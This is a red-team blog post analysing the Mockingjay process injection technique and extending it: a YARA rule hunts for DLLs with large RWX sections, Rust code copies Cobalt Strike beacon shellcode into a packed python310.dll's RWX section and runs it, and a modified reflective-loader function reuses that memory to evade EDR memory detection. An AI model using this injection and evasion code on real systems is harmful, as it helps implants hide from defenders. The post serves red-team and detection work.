---
title: Mockingjay - What is old is new again
subtitle: Riding the hype train to see if we can get something useful out of it
tags: [red-teaming]
linkedin: "https://www.linkedin.com/in/riccardo-ancarani/"
twitter: "https://twitter.com/dottor_morte"
date: "2023-07-31"
---

There has been quite a lot of rumor recently around the release of a piece of research that discuss a new (?) process injection technique that evades EDRs (what does that even mean?). For reference, these are the blog post I am referring to:

- [New Mockingjay process injection technique evades EDR detection](https://www.bleepingcomputer.com/news/security/new-mockingjay-process-injection-technique-evades-edr-detection/)

- [Process Mockingjay: Echoing RWX In Userland To Achieve Code Execution](https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution)

As consultants specialised in purple and red teaming, we get asked to analyse specific pieces of threat intelligence to achieve the following:

* Understand the research and determine the impact of the technique
* From a red team perspective, understand if there are aspect of the technique that present an advancement in the tradecraft that is worth incorporating in our internal arsenal

Without further ado, let's get stuck in!

## Understanding the technique

The core of the research is based off the idea that it is possible to DLLs with specific characteristics that make them "vulnerable". What do the authors exactly mean by that? Put simply, DLLs are just PE files, that - exactly like EXEs - have a number of sections. 
Each section can have different permission, specifically, a combination of Read, Write or Execute. 
The authors of the post focused on DLLs that happen to have one or more sections with Read, Write and Execute permissions (RWX). 
If you ever dealt with parsing a PE file, you will recall that usually RWX permission on a section is quite unusual and in the malware analysis world this is often associated with the usage of packers. 
There are - of course - multiple instances of DLLs that have such characteristics but are totally legitimate, and some of them are even signed by Microsoft. The authors of the research found that the msys-2.0.dll DLL have a section with approximately 16kB with RWX permissions.

So, why is this useful and relevant?

Recent advancements on the EDR world allowed these defensive software to gain more and more insights on the memory operations that processes perform. These advancements were necessary to combat process injection, one of the most common defense evasion techniques that is employed by red teamers (us lol) and actual threat actors. From a technical perspective, these advancements can be summarised in these three points:

* More aggressive and robust memory scanners - [CobaltStrike - Can I have your signature](https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature/)
* Insights on memory operations using Threat Intelligence ETW
* Insights on the callstack when an API call is made - [Upping the Ante: Detecting In-Memory Threats with Kernel Call Stacks](https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks)

Usually, to perform process injection, you need three actions:
* Allocate memory
* Write a malicious payload into that memory
* Trigger its execution

The existence of RWX "legitimate" RWX sections allow us to skip 2 out of the 3 primitives needed to achieve code execution. Specifically, we won't need to allocate any new memory as we can simply rely on the one that was previsouly allocated and when it comes to writing, we can avoid using well-known APIs, such as WriteProcess memory and instead copy byte by byte the malicious payload into the RWX memory blob.
Please note that we still need to somehow trigger execution, the authors of the blog post mentioned that it doesn't need any thread creation - hard to understand exactly what they meant with that.

Now this part of the research is where things get a bit sketchy, as the authors implement various defense evasion techniques but don't really exploit the power of this technique. In fact, the approach that the researchers suggested was to use the RWX blobs as some sort of trampoline where to store syscall instructions.

What are syscalls instructions? It would take too long to explain here, so please refer to the [Outflank](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) blog post about the subject. 

The authors decided to use direct syscalls, using the Hell's Gate technique, that are stored in the RWX memory space, to perform userland hook removal. While this is all good and cool, we should consider the following:

* More products are relying less and less on userland hooks to provide protection, as it was found to be a foundamentally flawed concept
* Hook removal is a big IoC on its own, and products that will keep using them will likely start implementing integrity checks on these

In addition, since most of the memory operation are still visible by the kernel using the TiETW provider, userland hooks are not the only mechanism that will come into play when it comes to process injection detection.

## Let's Steal Some TTPs

In general I liked the idea of piggybacking an existing RWX blob to do evil stuff, however, I think there is much more potential that the PoC that was shown. My plan was to find other DLLs with similar traits that will hopefully have a section big enough to store the entire cobalt strike stageless payload, and as we will see later on, even more...

The first thing was to find as many DLLs as possible that satisfed what I was looking for, to achieve this, I used Yara with the following rule:

```
import "pe"

rule RWX_Search
{
	condition:
		
		for any i in (0..pe.number_of_sections - 1): (
			(pe.sections[i].characteristics & pe.SECTION_MEM_READ) and
			(pe.sections[i].characteristics & pe.SECTION_MEM_EXECUTE) and
			(pe.sections[i].characteristics & pe.SECTION_MEM_WRITE) and pe.sections[i].virtual_size > 200KB )
}
```

Note that the Yara rule above was adapted from Bill Demirkapi's [blog post](https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/). You can also adjust the `virtual_size` parameter to be greater or equal to the size of the target shellcode.

Running it with `yara.exe pe-hunter.yar -r C:\` revealed a few interesting entries, including a very weird python310.dll that was dropped by PyInstaller in its temporary cache. Analysis of the DLL revealed that it was packed using UPX, and therefore had a section marked as RWX. The idea of finding packed DLLs was first introduced by namazso in 2018. 

To perform the attack, we could use the following code:

```rust
let python_dll_name = "python310.dll\0";

let shellcode = include_bytes!("beacon.bin");

// decrypt the shellcode 

unsafe {
    let h_base = LoadLibraryA(python_dll_name.as_ptr() as _);

    let position = (h_base as u64 + 0x1000 as u64) as LPVOID;
    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), position as *mut u8, shellcode.len());

    drop(shellcode);

    let ep: extern "system" fn(LPVOID) -> BOOL = { std::mem::transmute(position) };

    ep(null_mut());
}
```

We can see that the code simply calls LoadLibrary and then copies the shellcode to a hardcoded offset starting from the base address of the python DLL. The injection is done using function pointers but can be achieved using callbacks, fibers or whatever you're fancy.

This all works pretty well, however, given that we have plenty of spare space in the RWX blob, why not taking advantage of it? 

When injecting complex C2 frameworks, we have to take into account the fact that we likely have a reflective loader. The reflective loader, as outlined by [Fortra's researchers](https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature/), is a prime target for detections. 
For those who are not familiar with how the reflective loader works, I suggest to take a look at Stephen Fewer's original reflective loader project and read [this](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development/). 

In a nutshell, the reflective loader will perform a number of memory manipulation in order to allow the loading of the Cobalt Strike DLL completely in memory, this includes allocating new memory and writing to it. 

```
                 ┌───────────────────────┐
bootstrapping    │        Process        │
code, jumps to   │                       │
relective loader ├───────────────────────┤
     ──────────► │   Jump to R.L.        │ │
                 ├───────────────────────┤ │
                 │  Beacon DLL           │ │
                 │                       │ │
                 │                       │ │
                 ├───────────────────────┤ │
                 │ Reflective Loader     │ │
             │   │                       │◄┘
allocates    │   ├───────────────────────┤
memory       │   │                       │
             │   │                       │
             │   │                       │
             │   ├───────────────────────┤
             │   │                       │
             └─► │  New Beacon DLL       │
                 │                       │
                 ├───────────────────────┤
                 │                       │
                 │                       │
                 │                       │
                 └───────────────────────┘
```

This very simple and poor diagram shows at a high level what happens when you inject a cobalt strike beacon (or anything that uses a reflective loader) in memory. The initial shellcode is responsible for creating the new memory to host the actual beacon DLL, copying it over and then executing it.

Do you see where this is going? My idea was simple, since we already have RWX memory, why not modifying the reflective loader so that, instead of allocating additional space, it would use the same memory as before? Obviously we cannot overwrite the initial shellcode as it's currently being in use, but if we have enough space - which we do - we could simply write it at another position within the RWX blob and as long as it doesn't interfere with the initial bootstrapping code, we should be ok.

To achieve this, I used the User Defined Reflective Loader Visual Studio template, and modified it so instead of using VirtualAlloc, it would leverage `GetModuleHandleA` against `python310.dll` to retrieve its address, add an offset that would ensure that we don't mess with the initial shellcode and return it to the rest of the reflective loader.

The only major modification to the project would be the following function:

```c
ULONG_PTR AllocateMemory(PIMAGE_NT_HEADERS ntHeader, PWINDOWSAPIS winApi) {
	DWORD bufferSize = ntHeader->OptionalHeader.SizeOfImage;
	/**
	* allocate all the memory for the DLL to be loaded into. we can load at any address because we will relocate the image
	* we're using PAGE_EXECUTE_READWRITE as it's an example, but note - stage.userwx "true";
	*/
	PIC_STRING(dll_name, "python310.dll");
	ULONG_PTR address = (ULONG_PTR)winApi->GetModuleHandleA(dll_name);


	ULONG_PTR offset = (ULONG_PTR)(address + 0x1000 + (0x10000 * 8));
	
	winApi->memset((void*)offset, 0x0, bufferSize);

	return offset;
}
```

Now we should compile the project in release (Stephen Fewer or simple Release), x64, and import the CNA script that was already provided in the repository. The injection code won't change, but we should re-generate a new beacon RAW payload to ensure that we're stomping the default reflective loader with ours. 

Now if you execute the payload, you will see that there is only the initial RWX section and no additional floating private memory around. 

This approach still has needs to be improved. The main limitation is the lack of implementation of the other opsec features that the malleable PE offers out of the box, such as "obfuscate" and "cleanup". I don't know how usable this could be on an actual engagement, but I haven't seen the reuse of existing memory for the reflective loader elsewhere. If you want to contribute or improve it, feel free to reach out.

This was meant to be a simple example, the attack surface has yet to be explored properly, especially when it comes to .NET processes allocating miriads of RWX blobs for Just In Time compilation. 